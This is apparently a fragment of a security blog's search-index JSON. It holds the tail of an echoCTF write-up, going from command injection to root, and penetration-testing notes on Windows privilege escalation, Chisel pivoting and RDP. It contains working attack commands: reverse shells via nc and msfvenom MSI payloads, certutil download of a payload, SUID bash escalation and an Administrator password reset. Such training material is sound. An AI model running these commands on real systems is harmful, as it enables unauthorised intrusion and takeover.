1337/tcp open http syn-ack ttl 63 Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). | http-methods: |_ Supported Methods: POST GET HEAD Analyzing the NMAP scan we can see there is 1 port open 1337. It seems that its a webserver using Node.js Express framework.\nWhen we try to browse to it we get some informational message or \u0026ldquo;hint\u0026rdquo; that we have to make a POST request including a parameter called \u0026ldquo;ifname\u0026rdquo; and a network interface name\n‚îî‚îÄ$ curl -X POST \u0026#39;http://10.0.50.0:1337/\u0026#39; -d \u0026#39;ifname=anything\u0026#39; Used interface \u0026#34;anything\u0026#34; When following the format that they want, we get our input reflected back to us. So we can try breaking this by adding strange symbols, or fuzz it with words in order to get some sort of error back that will give us a clue what it is..\nWe can start with a small list first and then move to a bigger one.\nffuf -u http://10.0.50.0:1337/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -X POST -d \u0026#39;ifname=FUZZ\u0026#39; The output did not help at all as all the output was 200 OK.\nWe can start making logical assumptions on how the code is processing our input, it is obvious that is asking for an interface name which is then getting checked with some sort of mechanism and then reflect back to us.\nSo if we give it for example ifname=test and the code does echo test we can try to break out of echo and inject our own commands.\nThe following is perfect for what I am trying to say and is the one i have used to exploit this.\nhttps://hackviser.com/tactics/pentesting/web/command-injection\nExploitation Using the resource above i created a wordlist of payloads related to command injection and i was able to get command execution using the dollar subsitution method.\n‚îî‚îÄ$ python3 -m http.server 80 ‚îî‚îÄ$ curl -X POST \u0026#39;http://10.0.50.0:1337/\u0026#39; -d \u0026#39;ifname=$(curl%20http://10.10.11.150)\u0026#39; In order to get a reverse shell lets use nc and hope that it is installed on the target machine.\nsudo nc -nvlp 80 curl -X POST \u0026#39;http://10.0.50.0:1337/\u0026#39; -d \u0026#39;ifname=$(nc%2010.10.11.150%2080%20-e%20/bin/bash)\u0026#39; It worked! Notice that spaces are replaced with %20\nPrivilege Escalation Lets upgrade our shell using python\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo;fg (Press Enter) (Press Enter) (Press Enter) export TERM=xterm It seems that our users can run a binary as root!\nETSCTF@badwidth:/app$ sudo -l Matching Defaults entries for ETSCTF on badwidth: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User ETSCTF may run the following commands on badwidth: (ALL : ALL) NOPASSWD: /usr/local/bin/n158 In order to abuse this we have to understand what the program does.\nETSCTF@badwidth:/app$ cat /usr/local/bin/n158 #!/usr/bin/env node require(\u0026#39;../src/cli/index.js\u0026#39;);ETSCTF It seems that n158 is a link\nFound the source code, it seems that is importing another module called initiProject\nLooking into it we can see it uses shell.exec, if we can somehow inject our input to be executed from shell.exec we can get root!\nTrying to understand the code it seems the targetPath variable is controllable by us using the --name flag as shown in the index.js so we can trick the program into running our commands likewise:\nsudo /usr/local/bin/n158 init --name \u0026#39;;whoami\u0026#39; And we have command execution as root! So now in order to get an interactive shell we can make the /bin/bash binary a SUID and then run /bin/bash -p to get root\nsudo /usr/local/bin/n158 init --name \u0026#39;;chmod u+s /bin/bash\u0026#39; CTRL + C /bin/bash -p ROOT!\n","date":"2025-06-03T00:00:00Z","permalink":"https://hack.com.cy/writeups/echoctf/badwidth/badwidth/","section":"writeups","tags":["Command Injection","Linux","privilege escalation"],"title":"echoCTF Badwidth Writeup: Command Injection to Root"},{"categories":null,"contents":"Quick Wins Powershell History # Powershell 5.0 in Windows 10, PowerShell stores command history to the file # Checking Powershell History PS C:\\dotpirate\u0026gt; Get-History # PowerShell v5, v5.1, and v7 is included # Retrieve the history from PSReadline PS C:\\dotpirate\u0026gt; (Get-PSReadLineOption).HistorySavePath PS C:\\dotpirate\u0026gt; gc (Get-PSReadLineOption).HistorySavePath type C:\\Users\\dotpirate\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt cat \u0026#34;C:\\Users\\dotpirate\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\u0026#34; Always Installed Elevated Check if its enabled (if 0x1 appears we are good to go )\nPS C:\\dotpirate\u0026gt; reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer PS C:\\dotpirate\u0026gt; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer Exploit it\n# Create a malicious .msi sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.137 LPORT=80 -a x64 --platform windows -f msi -o shell.msi # Serve it python3 -m http.server 9090 # On Target certutil -urlcache -f http://10.10.10.137/shell.msi shell.msi msiexec /quiet /qn /i shell.msi SeImporsonate Privilege Check if we have SeImpersonate\nwhoami /priv # Check if it works GodPotato -cmd \u0026#34;cmd /c whoami\u0026#34; # Reverse Shell GodPotato -cmd \u0026#34;nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.49.116 80\u0026#34; # If it does not work try change the Administrator password GodPotato -cmd \u0026#34;cmd /c net user Administrator d0tpirate\u0026#34; Manual Enumeration Any other users on the machine?\nnet user If there are other user\u0026rsquo;s on the machine, check their groups, any of them have interesting groups?\nnet user \u0026lt;username\u0026gt; What groups am I in?\nwhoami /groups Any local services running on the machine?\nnetstat -ano | findstr LISTENING # If we want to check who (SYSTEM, USER) is ruinning a specific service netstat -ano | findstr :8000 Get-WmiObject Win32_Process -Filter \u0026#34;ProcessId = 4\u0026#34; | ForEach-Object { $_.GetOwner() } wmic process where processid=4 get ProcessID,Name,ExecutablePath,CSName,Description,Caption,Status /format:list tasklist /fi \u0026#34;pid eq 1344\u0026#34; Any unusual or hidden directories in \u0026ldquo;C:/\u0026rdquo;? Any unusual or hidden files/directories in my user\u0026rsquo;s home directory?\ncd ~ powershell.exe -ep bypass gci -force tree /F Automation I personaly use the following\u0026hellip;\n.\\winpeasx64.exe . .\\PowerUp.ps1 InvokeAllChecks .\\SharpUp.exe audit ","date":"0001-01-01T00:00:00Z","permalink":"https://hack.com.cy/notes/privilege-escalation/windows/mymethodology/mymethodology/","section":"notes","tags":null,"title":""},{"categories":null,"contents":"Scenario for Reference Kali - tun0 / 10.10.15.115 Ubuntu-Pivot - ens192 / 10.129.110.16 - ens224 / 172.16.5.129 Windows-Unreachable-Target - 172.16.5.19 Set Up Chisel git clone https://github.com/jpillora/chisel.git cd chisel go build Transferring \u0026amp; Running Chisel binary on Pivot Host # Kali scp -r chisel ubuntu@10.129.110.16:/home/ubuntu ssh ubuntu@10.129.110.16 # Ubuntu-pivot ./chisel.server -v -p 1234 --socks5 \u0026#34;-\u0026gt; Chistel now listens on incoming connecection on port 1234 using SOCKS5 and will forward all traffic to all networks (interfaces) connected on the machine \u0026#34; # Kali ./chisel client -v 10.129.110.16:1234 socks \u0026#34;The output will display the listening port that the client has initiated (tun: proxy#127.0.0.1:PORT\u0026lt;1080\u0026gt;=\u0026gt;socks: Listening)\u0026#34; sudo nano /etc/proxychains4.conf \u0026#34;socks5 127.0.0.1 1080\u0026#34; proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 Chisel Reverse Pivot When Inbound traffic to pivot-host-ubuntu is blocked\n# Kali sudo ./chisel server --reverse -v -p 1234 --socks5 # Ubuntu-p ./chisel client -v 10.10.15.115:1234 R:socks # Kali sudo nano /etc/proxychains4.conf \u0026#34;socks5 127.0.0.1 1080\u0026#34; proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 Multiple Local PortForwarding Scenario + kali: 192.168.45.112 + Target (Windows): 19.168.205.95 The target is running 3 services locally on ports 15432, 18005, 32000. We want to access these ports from kali # Kali ./chisel server --reverse --port 8810 # Windows chisel_windows.exe client 192.168.49.116:8810 R:49673:127.0.0.1:49673 R:49674:127.0.0.1:49674 R:49675:127.0.0.1:49675 NMAP sudo nmap -nvv -Pn --open -p 15432, 18005, 32000 127.0.0.1 ","date":"0001-01-01T00:00:00Z","permalink":"https://hack.com.cy/notes/port-forwarding/chisel/chisel/","section":"notes","tags":null,"title":"Port Forwarding with Chisel"},{"categories":null,"contents":"sudo xfreerdp3 /v:10.129.202.222 /u:dotpirate /p:\u0026#39;1231234!\u0026#39; /cert:ignore /size:90% +drive:dotpirate,/home/dotpirate/path/to/share ","date":"0001-01-01T00:00:00Z","permalink":"https://hack.com.cy/notes/file-transfers/rdp/rdp/","section":"notes","tags":null,"title":"Using RDP"}]